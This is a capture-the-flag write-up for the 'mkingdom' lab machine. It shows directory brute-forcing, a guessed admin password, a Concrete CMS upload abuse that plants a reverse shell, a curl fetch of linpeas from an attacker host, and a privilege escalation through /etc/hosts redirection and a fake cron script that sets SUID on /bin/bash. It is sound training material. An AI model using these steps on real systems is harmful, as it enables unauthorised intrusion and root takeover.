# mkingdom :

# Enumeration:

I found the Port 85 referring to HTTP instead of 80.

# Directory bruteforcing:

I found his /app directory that contain the web app with the concrete cms 8.5.2, this version has a CVE-2020-11476.

```sh
gobuster dir --url http://10.10.198.213:85/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```sh
/app                  (Status: 301) [Size: 314] [--> http://10.10.198.213:85/app/]
```

I checked the Blog to see if i can find some users .

![Screenshot_2](https://github.com/user-attachments/assets/2604c4b7-bae8-429e-bc76-78ef13368784)

I found this user 

![Screenshot_3](https://github.com/user-attachments/assets/3bd15567-9cb4-4f04-8508-c8d179095415)

I attempted some default passwords for the 'admin' user, and it turns out the password is simply 'password'.

As previously mentioned, Concrete CMS version 8.5.2 has a vulnerability that allowed me to add an extension, enabling the upload of PHP file types to the machine.

I successfully uploaded a PHP reverse shell to the target machine and obtained the IP address needed to execute it.

I used linpeas to enumerate the machine 

```sh
Attacker Machine
python3 -m http.server 80
Victim Machine
curl http://attackerIP/linpeas.sh -o linpeas.sh 
./linpeas.sh
```
While inspecting the application configuration for Concrete CMS version 8.5.2, I discovered the password for the user 'toad' stored in the configuration file.

![Screenshot_11](https://github.com/user-attachments/assets/0720af85-e3b0-4c3b-9f2e-d7058ef7685d)

After extensive enumeration, I discovered that the password for the user 'mario' is stored within the environment variables.

![Screenshot_12](https://github.com/user-attachments/assets/265fc5aa-47c5-4814-ab52-d1be3675cd12)

```sh
echo 'aWthVGVOVEFOdEVTCg==' |base64 -d                         
ikaTeNTANtES   => mario password
```
I used pspy to snoop on processes without need for root permissions, by doing this i got this running crons.

/bin/cat has SUID permissions, meaning it can be executed with the privileges of the file owner (likely root).
/etc/hosts is owned by the user mario

I replaced the localhost ip with our vpn ip to use it further.

```sh
awk '{gsub("127.0.1.1\tmkingdom.thm", "AttackerIP\t\tmkingdom.thm"); print}' /etc/hosts > /tmp/replace_hosts
```
I then utilized the SUID-enabled /bin/cat to write the contents of /tmp/replace_hosts to /etc/hosts, resulting in the file being modified to look like this:

```sh
mario@mkingdom:~$ cat /tmp/replace_hosts  > /etc/hosts
mario@mkingdom:~$ cat /etc/hosts
127.0.0.1	localhost
AttackerIP		mkingdom.thm
127.0.0.1	backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnod
```

Since counter.sh is executed automatically via cron, we could manipulate it to run commands of our choice.

With write access to /etc/hosts, we can modify entries to redirect network requests or disrupt normal hostname resolution.

The /etc/cat file, with SUID permissions, allows us to execute it as the file owner (likely root), which can be exploited to read or manipulate sensitive files.

1. Create a counterfeit directory on the attacker machine:
We will replicate the directory structure where counter.sh is located on the victim machine inside the /tmp directory on our attacker machine. This will allow us to host our counterfeit version of counter.sh.
```sh
mkdir -p /tmp/app/castle/application
vim /tmp/app/castle/application/counter.sh
```

```sh

#! /usr/bin/env bash

chmod 4755 /bin/bash
```

2. Host a fake script using Python's HTTP server:
Using Pythonâ€™s http.server, we can set up a simple web server on the same port that the victim machine is likely to connect to. This will trick the victim into downloading our malicious script instead of the original one.

```sh
sudo python3 -m http.server 85 --direcotry /tmp
```

3. Replace the real counter.sh on the victim machine:
By getting the cron job to download our counterfeit script from our attack machine, we can replace the original counter.sh with our own, gaining control over what commands it executes when the cron job runs.
